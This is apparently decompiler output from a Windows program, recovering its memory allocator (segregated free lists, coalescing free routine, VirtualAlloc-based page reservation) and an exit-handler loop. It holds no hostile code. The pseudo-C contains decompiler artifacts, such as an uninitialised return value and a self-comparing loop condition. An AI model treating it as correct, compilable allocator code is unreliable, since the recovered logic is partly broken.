	byte al_12 = Mem0[edx_10 + 0x00000000:byte];
	while (al_12 != 0x00 && al_12 <=u 0x20)
	{
		edx_10 = edx_10 + 0x00000001;
		al_12 = Mem0[edx_10 + 0x00000000:byte];
	}
	return;
}

void fn00402710(word32 dwArg04)
{
	word32 ebx_21 = dwArg04;
	if (Mem0[0x00405258:word32] <u 0x00000050)
		do
		{
			word32 eax_45 = Mem0[0x00405258:word32];
			Mem47[0x00405258:word32] = eax_45 + 0x00000001;
			0x00405118[eax_45 * 0x00000004]();
		} while (Mem47[0x00405258:word32] <u 0x00000050);
	if (Mem0[0x0040525C:word32] != 0x00000000)
		do
		{
			word32 eax_39 = Mem0[0x0040525C:word32];
			Mem42[0x0040525C:word32] = eax_39 - 0x00000001;
			0x00405118[(eax_39 - 0x00000001) * 0x00000004]();
		} while (Mem42[0x0040525C:word32] != 0x00000000);
	fn004020C0(ebx_21);
	return;
}

word32 fn004027E0(word32 dwArg04)
{
	return dwArg04;
}

word32 fn00402860(word32 dwArg04)
{
	word32 eax_134;
	word32 ebx_17 = (dwArg04 + 0x00000003 >>u 0x0000000E) + 0x00000001 << 0x0000000E;
	word32 eax_23 = fn004031F0(ebx_17 << 0x00000002);
	if (eax_23 == 0x00000000)
	{
		Mem47[0x0040505C:word32] = 0x00000000;
		eax_134 = 0x00000000;
	}
	else
	{
		word32 esi_226;
		word32 edi_224;
		if (Mem0[0x004056AC:word32] + Mem0[0x004056A8:word32] == eax_23)
		{
			esi_226 = (ebx_17 << 0x00000002) + Mem0[0x004056AC:word32];
			edi_224 = Mem0[0x004056A8:word32];
			ebx_17 = esi_226 >>u 0x00000002;
		}
		else
		{
			edi_224 = eax_23;
			esi_226 = (ebx_17 << 0x00000002) - eax_23 + eax_23;
		}
		Mem64[0x004056A8:word32] = edi_224 + ebx_17 * 0x00000004;
		Mem69[0x004056AC:word32] = -(ebx_17 << 0x00000002) + esi_226;
		if (Mem69[0x00405284:word32] + 0x00000004 == edi_224 && Mem69[0x0040528C:word32] != 0x00000000)
		{
			word32 edi_193 = edi_224 + 0xFFFFFFFC;
			word32 eax_196 = (Mem69[edi_193 + 0x00000000:word32] & 0x7FFFFFFF) + ebx_17;
			Mem199[edi_193 + 0x00000000:word32] = ebx_17 | 0x80000000;
			word32 edx_201 = Mem199[0x00405284:word32] + ebx_17 * 0x00000004;
			Mem202[0x00405284:word32] = edx_201;
			Mem204[edx_201 - 0x00000004:word32] = Mem202[edi_193 + 0x00000000:word32];
			Mem208[Mem204[0x00405284:word32]:word32] = eax_196 | 0x80000000;
			Mem217[Mem208[0x00405284:word32] - (eax_196 << 0x00000002) + 0x00000004:word32] = eax_196 | 0x80000000;
			fn00403110(edi_193 + 0x00000004);
			eax_134 = 0x00000001;
		}
		else
		{
			word32 eax_75 = Mem69[0x0040528C:word32];
			Mem76[0x0040528C:word32] = edi_224;
			Mem77[edi_224 + 0x00000000:word32] = eax_75;
			word32 edi_78 = edi_224 + 0x00000004;
			Mem80[0x00405284:word32] = edi_78;
			word32 ebx_79 = ebx_17 - 0x00000001;
			word32 eax_81 = Mem80[0x00405288:word32];
			if (eax_81 == 0x00000000 || eax_81 >u edi_78)
				Mem188[0x00405288:word32] = edi_78;
			word32 eax_104;
			Mem87[edi_78 + 0x00000000:word32] = ebx_79 | 0x80000000;
			word32 eax_89 = Mem87[0x00405284:word32] - 0x00000004 + ebx_79 * 0x00000004;
			Mem90[0x00405284:word32] = eax_89;
			Mem93[eax_89 + 0x00000000:word32] = ebx_79 | 0x80000000;
			word32 eax_95 = Mem93[0x00405284:word32];
			if (ebx_79 - 0x00000002 >u Mem93[0x0040529C:word32])
				if (ebx_79 - 0x00000002 <=u Mem93[0x004052A4:word32])
					eax_104 = ((word32) (ebx_79 - 0x00000002 <=u Mem93[0x004052A0:word32]) - 0x00000001 & 0x00000001) + 0x00000004;
				else if (ebx_79 - 0x00000002 <=u Mem93[0x004052A8:word32])
					eax_104 = 0x00000006;
				else
					eax_104 = 0x00000007;
			else if (ebx_79 - 0x00000002 <=u Mem93[0x00405294:word32])
				eax_104 = (word32) (ebx_79 - 0x00000002 >u Mem93[0x00405290:word32]);
			else if (ebx_79 - 0x00000002 <=u Mem93[0x00405298:word32])
				eax_104 = 0x00000002;
			else
				eax_104 = 0x00000003;
			word32 edx_110;
			Mem105[0x004052B4:word32] = eax_104;
			word32 eax_106 = 0x00405260[eax_104 * 0x00000004];
			if (eax_106 == 0x00000000)
			{
				0x00405260[Mem105[0x004052B4:word32] * 0x00000004] = eax_95 - 0x00000004;
				edx_110 = eax_95 - 0x00000004;
				eax_106 = eax_95 - 0x00000004;
				if (Mem143[0x004052B0:word32] > Mem143[0x004052B4:word32])
					Mem148[0x004052B0:word32] = Mem143[0x004052B4:word32];
			}
			else
				edx_110 = Mem105[eax_106 - 0x00000008:word32];
			Mem114[eax_95 - 0x00000008:word32] = eax_106;
			Mem115[eax_106 - 0x00000008:word32] = eax_95 - 0x00000004;
			Mem116[edx_110 - 0x00000004:word32] = eax_95 - 0x00000004;
			Mem117[eax_95 - 0x0000000C:word32] = edx_110;
			Mem123[-(ebx_79 - 0x00000002 << 0x00000002) + (eax_95 - 0x00000004) + 0x00000004:word32] = ebx_79 - 0x00000002;
			Mem124[eax_95 - 0x00000004:word32] = ebx_79 - 0x00000002;
			0x00405260[Mem124[0x004052B4:word32] * 0x00000004] = eax_95 - 0x00000004;
			word32 eax_129 = Mem126[0x004052B0:word32];
			while (0x00405260[eax_129 * 0x00000004] == 0x00000000 && eax_129 < 0x00000007)
			{
				Mem138[0x004052B0:word32] = Mem126[0x004052B0:word32] + 0x00000001;
				eax_129 = Mem126[0x004052B0:word32];
			}
			eax_134 = 0x00000001;
		}
	}
	return eax_134;
}

word32 fn00402AB0(word32 dwArg04)
{
	word32 edx_19 = dwArg04 + 0x00000003 >>u 0x00000002;
	word32 ebx_102 = edx_19 + 0x00000002;
	if (edx_19 <u 0xFFFFFFFE)
		ebx_102 = 0x00000004;
	word32 eax_31;
	if (ebx_102 >u Mem0[0x0040529C:word32])
		if (ebx_102 <=u Mem0[0x004052A4:word32])
			eax_31 = ((word32) (ebx_102 <=u Mem0[0x004052A0:word32]) - 0x00000001 & 0x00000001) + 0x00000004;
		else if (ebx_102 <=u Mem0[0x004052A8:word32])
			eax_31 = 0x00000006;
		else
			eax_31 = 0x00000007;
	else if (ebx_102 <=u Mem0[0x00405294:word32])
		eax_31 = (word32) (ebx_102 >u Mem0[0x00405290:word32]);
	else if (ebx_102 <=u Mem0[0x00405298:word32])
		eax_31 = 0x00000002;
	else
		eax_31 = 0x00000003;
	word32 esi_286 = eax_31;
	word32 edi_287 = 0x00000000;
	word32 dwLoc08_289 = 0x00000000;
	if (eax_31 < Mem0[0x004052B0:word32])
	{
		esi_286 = Mem0[0x004052B0:word32];
		Mem324[fp - 0x00000008:word32] = 0x00000000;
		edi_287 = 0x00000000;
		goto l00402B97;
	}
l00402B97:
	do
	{
		if (dwLoc08_289 >=u ebx_102)
		{
			word32 eax_115;
			if (dwLoc08_289 <u ebx_102)
				if (eax_115 != 0x00000000)
				{
					esi_286 = Mem0[0x004052B4:word32];
					edi_287 = 0x00405260[esi_286 * 0x00000004];
					dwLoc08_289 = Mem0[edi_287 + 0x00000000:word32];
l00402BCE:
					word32 eax_89 = dwLoc08_289 - ebx_102;
					if (eax_89 >=u 0x00000004)
					{
						word32 dwLoc0C_120;
						if (eax_89 <=u Mem0[0x0040529C:word32])
						{
							word32 edx_205;
							if (eax_89 <=u Mem0[0x00405294:word32])
								edx_205 = (word32) (eax_89 >u Mem0[0x00405290:word32]);
							else if (eax_89 <=u Mem0[0x00405298:word32])
								edx_205 = 0x00000002;
							else
								edx_205 = 0x00000003;
							dwLoc0C_120 = edx_205;
						}
						else if (eax_89 <=u Mem0[0x004052A4:word32])
							dwLoc0C_120 = ((word32) (eax_89 <=u Mem0[0x004052A0:word32]) - 0x00000001 & 0x00000001) + 0x00000004;
						else if (eax_89 <=u Mem0[0x004052A8:word32])
							dwLoc0C_120 = 0x00000006;
						else
							dwLoc0C_120 = 0x00000007;
						if (dwLoc0C_120 != esi_286)
						{
							word32 edx_127 = Mem0[edi_287 - 0x00000004:word32];
							if (edi_287 == edx_127)
							{
								0x00405260[esi_286 * 0x00000004] = 0x00000000;
								if (Mem168[0x004052B0:word32] == esi_286)
								{
									word32 ecx_174 = Mem168[0x004052B0:word32];
									while (0x00405260[ecx_174 * 0x00000004] == 0x00000000)
									{
										if (ecx_174 >= 0x00000007)
											goto l00402CBE;
										Mem181[0x004052B0:word32] = Mem168[0x004052B0:word32] + 0x00000001;
										ecx_174 = Mem168[0x004052B0:word32];
									}
								}
							}
							else
							{
								word32 ecx_183 = Mem0[edi_287 - 0x00000008:word32];
								Mem185[ecx_183 - 0x00000004:word32] = edx_127;
								Mem186[edx_127 - 0x00000008:word32] = ecx_183;
								if (0x00405260[esi_286 * 0x00000004] == edi_287)
									0x00405260[esi_286 * 0x00000004] = ecx_183;
							}
l00402CBE:
							word32 dwLoc18_140;
							word32 edx_136 = 0x00405260[dwLoc0C_120 * 0x00000004];
							if (edx_136 == 0x00000000)
							{
								0x00405260[dwLoc0C_120 * 0x00000004] = edi_287;
								dwLoc18_140 = edi_287;
								edx_136 = edi_287;
								if (Mem160[0x004052B0:word32] > dwLoc0C_120)
									Mem165[0x004052B0:word32] = dwLoc0C_120;
							}
							else
								dwLoc18_140 = Mem0[edx_136 - 0x00000008:word32];
							Mem144[edi_287 - 0x00000004:word32] = edx_136;
							Mem145[edx_136 - 0x00000008:word32] = edi_287;
							Mem147[dwLoc18_140 - 0x00000004:word32] = edi_287;
							Mem149[edi_287 - 0x00000008:word32] = dwLoc18_140;
							Mem155[-(eax_89 << 0x00000002) + edi_287 + 0x00000004:word32] = eax_89;
							Mem156[edi_287 + 0x00000000:word32] = eax_89;
						}
						else
						{
							Mem195[-(eax_89 << 0x00000002) + edi_287 + 0x00000004:word32] = eax_89;
							Mem196[edi_287 + 0x00000000:word32] = eax_89;
						}
					}
					else
					{
						word32 eax_235 = Mem0[edi_287 - 0x00000004:word32];
						if (edi_287 == eax_235)
						{
							0x00405260[esi_286 * 0x00000004] = 0x00000000;
							if (Mem247[0x004052B0:word32] == esi_286)
							{
								word32 edx_252 = Mem247[0x004052B0:word32];
								while (0x00405260[edx_252 * 0x00000004] == 0x00000000)
								{
									if (edx_252 >= 0x00000007)
										goto l00402D7B;
									Mem258[0x004052B0:word32] = Mem247[0x004052B0:word32] + 0x00000001;
									edx_252 = Mem247[0x004052B0:word32];
								}
							}
						}
						else
						{
							word32 edx_260 = Mem0[edi_287 - 0x00000008:word32];
							Mem261[edx_260 - 0x00000004:word32] = eax_235;
							Mem262[eax_235 - 0x00000008:word32] = edx_260;
							if (0x00405260[esi_286 * 0x00000004] == edi_287)
								0x00405260[esi_286 * 0x00000004] = edx_260;
						}
l00402D7B:
						ebx_102 = dwLoc08_289;
					}
					word32 eax_107 = -(dwLoc08_289 * 0x00000002 * 0x00000002) + edi_287;
					word32 eax_110 = ebx_102 | 0x80000000;
					eax_107[ebx_102 * 0x00000004] = eax_110;
					Mem114[eax_107 + 0x00000004:word32] = eax_110;
					eax_115 = eax_107 + 0x00000008;
				}
			else if (esi_286 > 0x00000000)
				esi_286 = esi_286 - 0x00000001;
			return eax_115;
		}
		if (esi_286 >= 0x00000008)
			;
		word32 eax_302 = 0x00405260[esi_286 * 0x00000004];
		esi_286 = esi_286 + 0x00000001;
		edi_287 = eax_302;
	} while (eax_302 == 0x00000000);
	if (Mem0[0x00405284:word32] + 0xFFFFFFFC == eax_302)
		edi_287 = Mem0[eax_302 - 0x00000004:word32];
	do
	{
		word32 edx_315 = Mem0[edi_287 + 0x00000000:word32];
		dwLoc08_289 = edx_315;
		if (edx_315 >=u ebx_102)
			break;
		edi_287 = Mem0[edi_287 - 0x00000004:word32];
	} while (edi_287 != edi_287);
}

word32 fn00402DB0(word32 dwArg04)
{
	word32 esi_10 = 0x00000000;
	if (dwArg04 <u Mem0[0x0040505C:word32])
		esi_10 = fn00402AB0(dwArg04);
	if (esi_10 == 0x00000000)
		esi_10 = fn00402020(dwArg04);
	if (esi_10 == 0x00000000)
		Mem38[0x004052BC:word32] = 0x0000000C;
	return esi_10;
}

void fn00402DF0(word32 dwArg04)
{
	if ((Mem0[dwArg04 + 0xFFFFFFFC:word32] & 0x80000000) == 0x00000000)
		Mem44[0x004052BC:word32] = 0x00000016;
	else
	{
		word32 eax_52 = Mem0[dwArg04 + 0xFFFFFFFC:word32];
		word32 eax_197 = eax_52 & 0x7FFFFFFF;
		word32 edx_298 = dwArg04 + 0xFFFFFFF8 + (eax_52 & 0x7FFFFFFF) * 0x00000004;
		word32 dwLoc08_289 = dwLoc08 | 0xFFFFFFFF;
		if ((Mem0[edx_298 + 0x00000004:word32] & 0x80000000) == 0x00000000)
		{
			word32 dwLoc0C_284;
			word32 esi_280 = edx_298 + Mem0[edx_298 + 0x00000004:word32] * 0x00000004;
			if (Mem0[esi_280 + 0x00000000:word32] <=u Mem0[0x0040529C:word32])
			{
				word32 ecx_304;
				if (Mem0[esi_280 + 0x00000000:word32] <=u Mem0[0x00405294:word32])
					ecx_304 = (word32) (Mem0[esi_280 + 0x00000000:word32] >u Mem0[0x00405290:word32]);
				else if (Mem0[esi_280 + 0x00000000:word32] <=u Mem0[0x00405298:word32])
					ecx_304 = 0x00000002;
				else
					ecx_304 = 0x00000003;
				dwLoc0C_284 = ecx_304;
			}
			else if (Mem0[esi_280 + 0x00000000:word32] <=u Mem0[0x004052A4:word32])
				dwLoc0C_284 = ((word32) (Mem0[esi_280 + 0x00000000:word32] <=u Mem0[0x004052A0:word32]) - 0x00000001 & 0x00000001) + 0x00000004;
			else if (Mem0[esi_280 + 0x00000000:word32] <=u Mem0[0x004052A8:word32])
				dwLoc0C_284 = 0x00000006;
			else
				dwLoc0C_284 = 0x00000007;
			eax_197 = (eax_52 & 0x7FFFFFFF) + Mem0[esi_280 + 0x00000000:word32];
			Mem291[esi_280 + 0x00000000:word32] = eax_197;
			Mem297[-(eax_197 << 0x00000002) + esi_280 + 0x00000004:word32] = eax_197;
			dwLoc08_289 = dwLoc0C_284;
			edx_298 = esi_280;
		}
		if ((Mem0[dwArg04 + 0xFFFFFFF8:word32] & 0x80000000) == 0x00000000)
		{
			word32 esi_202;
			eax_197 = eax_197 + Mem0[dwArg04 + 0xFFFFFFF8:word32];
			if (Mem0[dwArg04 + 0xFFFFFFF8:word32] <=u Mem0[0x0040529C:word32])
			{
				word32 ecx_243;
				if (Mem0[dwArg04 + 0xFFFFFFF8:word32] <=u Mem0[0x00405294:word32])
					ecx_243 = (word32) (Mem0[dwArg04 + 0xFFFFFFF8:word32] >u Mem0[0x00405290:word32]);
				else if (Mem0[dwArg04 + 0xFFFFFFF8:word32] <=u Mem0[0x00405298:word32])
					ecx_243 = 0x00000002;
				else
					ecx_243 = 0x00000003;
				esi_202 = ecx_243;
			}
			else if (Mem0[dwArg04 + 0xFFFFFFF8:word32] <=u Mem0[0x004052A4:word32])
				esi_202 = ((word32) (Mem0[dwArg04 + 0xFFFFFFF8:word32] <=u Mem0[0x004052A0:word32]) - 0x00000001 & 0x00000001) + 0x00000004;
			else if (Mem0[dwArg04 + 0xFFFFFFF8:word32] <=u Mem0[0x004052A8:word32])
				esi_202 = 0x00000006;
			else
				esi_202 = 0x00000007;
			word32 ecx_204 = Mem0[dwArg04 + 0xFFFFFFF4:word32];
			if (dwArg04 + 0xFFFFFFF8 == ecx_204)
			{
				0x00405260[esi_202 * 0x00000004] = 0x00000000;
				if (Mem219[0x004052B0:word32] == esi_202)
				{
					word32 esi_224 = Mem219[0x004052B0:word32];
					while (0x00405260[esi_224 * 0x00000004] == 0x00000000)
					{
						if (esi_224 >= 0x00000007)
							goto l00402FB5;
						Mem230[0x004052B0:word32] = Mem219[0x004052B0:word32] + 0x00000001;
						esi_224 = Mem219[0x004052B0:word32];
					}
				}
			}
			else
			{
				word32 esi_232 = Mem0[dwArg04 + 0xFFFFFFF0:word32];
				Mem233[esi_232 - 0x00000004:word32] = ecx_204;
				Mem234[ecx_204 - 0x00000008:word32] = esi_232;
				if (0x00405260[esi_202 * 0x00000004] == dwArg04 + 0xFFFFFFF8)
					0x00405260[esi_202 * 0x00000004] = esi_232;
			}
l00402FB5:
			Mem212[edx_298 + 0x00000000:word32] = eax_197;
			Mem218[-(eax_197 << 0x00000002) + edx_298 + 0x00000004:word32] = eax_197;
		}
		word32 ebx_163;
		if (eax_197 <=u Mem0[0x0040529C:word32])
		{
			word32 ecx_161;
			if (eax_197 <=u Mem0[0x00405294:word32])
				ecx_161 = (word32) (eax_197 >u Mem0[0x00405290:word32]);
			else if (eax_197 <=u Mem0[0x00405298:word32])
				ecx_161 = 0x00000002;
			else
				ecx_161 = 0x00000003;
			ebx_163 = ecx_161;
		}
		else if (eax_197 <=u Mem0[0x004052A4:word32])
			ebx_163 = ((word32) (eax_197 <=u Mem0[0x004052A0:word32]) - 0x00000001 & 0x00000001) + 0x00000004;
		else if (eax_197 <=u Mem0[0x004052A8:word32])
			ebx_163 = 0x00000006;
		else
			ebx_163 = 0x00000007;
		if (dwLoc08_289 != ebx_163)
		{
			if (dwLoc08_289 >= 0x00000000)
			{
				word32 ecx_129 = Mem0[edx_298 - 0x00000004:word32];
				if (edx_298 == ecx_129)
				{
					0x00405260[dwLoc08_289 * 0x00000004] = 0x00000000;
					if (Mem134[0x004052B0:word32] == dwLoc08_289)
					{
						word32 ebx_140 = Mem134[0x004052B0:word32];
						while (0x00405260[ebx_140 * 0x00000004] == 0x00000000)
						{
							if (ebx_140 >= 0x00000007)
								goto l004030AD;
							Mem146[0x004052B0:word32] = Mem134[0x004052B0:word32] + 0x00000001;
							ebx_140 = Mem134[0x004052B0:word32];
						}
					}
				}
				else
				{
					word32 ebx_148 = Mem0[edx_298 - 0x00000008:word32];
					Mem149[ebx_148 - 0x00000004:word32] = ecx_129;
					Mem150[ecx_129 - 0x00000008:word32] = ebx_148;
					if (0x00405260[dwLoc08_289 * 0x00000004] == edx_298)
						0x00405260[dwLoc08_289 * 0x00000004] = ebx_148;
				}
			}
l004030AD:
			word32 ebx_107;
			word32 ecx_106 = 0x00405260[ebx_163 * 0x00000004];
			if (ecx_106 == 0x00000000)
			{
				0x00405260[ebx_163 * 0x00000004] = edx_298;
				ebx_107 = edx_298;
				ecx_106 = edx_298;
				if (Mem124[0x004052B0:word32] > ebx_163)
					Mem127[0x004052B0:word32] = ebx_163;
			}
			else
				ebx_107 = Mem0[ecx_106 - 0x00000008:word32];
			Mem108[edx_298 - 0x00000004:word32] = ecx_106;
			Mem109[ecx_106 - 0x00000008:word32] = edx_298;
			Mem110[ebx_107 - 0x00000004:word32] = edx_298;
			Mem111[edx_298 - 0x00000008:word32] = ebx_107;
			Mem117[-(eax_197 << 0x00000002) + edx_298 + 0x00000004:word32] = eax_197;
			Mem118[edx_298 + 0x00000000:word32] = eax_197;
			Mem119[0x004052B4:word32] = ebx_163;
			0x00405260[ebx_163 * 0x00000004] = edx_298;
		}
	}
	return;
}

void fn00403110(word32 dwArg04)
{
	if (dwArg04 != 0x00000000)
		if (dwArg04 - 0x00000004 >u Mem0[0x00405288:word32] && dwArg04 - 0x00000004 <u Mem0[0x00405284:word32])
			fn00402DF0(dwArg04);
		else
			fn00402060(dwArg04);
	return;
}

word32 fn004031F0(word32 dwArg04)
{
	word32 eax_28;
	if (Mem0[0x00405054:word32] == 0x00000000)
	{
		eax_28 = VirtualAlloc(0x00000000, Mem0[0x00405058:word32], 0x00002000, 0x00000001);
		Mem97[0x00405054:word32] = eax_28;
		if (eax_28 != 0x00000000)
		{
l00403222:
			Mem41[fp - 0x0000002C:word32] = 0x0000001C;
			Mem44[fp - 0x00000030:word32] = fp - 0x00000020;
			eax_28 = VirtualQuery(Mem44[0x00405054:word32], 0x00002000, 0x00000001);
			if (eax_28 != 0x00000000)
			{
				word32 eax_57;
				if (dwLoc10 == 0x00001000)
					eax_57 = dwLoc14 + Mem44[0x00405054:word32];
				else
					eax_57 = Mem44[0x00405054:word32];
				if (dwArg04 + eax_57 >=u Mem44[0x00405058:word32] + Mem44[0x00405054:word32])
					eax_28 = 0x00000000;
				else
				{
					Mem68[fp - 0x0000002C:word32] = 0x00000004;
					Mem74[fp - 0x00000038:word32] = eax_57;
					eax_28 = VirtualAlloc(0x00000000, dwArg04, 0x00001000, 0x0000001C);
					if (eax_28 != 0x00000000)
						eax_28 = eax_57;
				}
			}
		}
	}
	else
		goto l00403222;
	return eax_28;
}

